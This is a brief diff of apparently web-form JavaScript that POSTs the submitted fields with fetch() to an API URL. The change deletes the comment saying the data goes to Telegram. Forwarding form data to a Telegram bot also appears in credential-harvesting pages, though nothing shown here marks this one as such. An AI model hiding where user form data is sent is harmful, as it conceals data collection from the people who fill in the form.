@@ -511,7 +511,7 @@
       const formattedData = entries.map(([key, value]) => `${key}: ${value}`).join("\n");
   
       try {
-        // Send form data to Telegram
+        
         const response = await fetch(apiUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
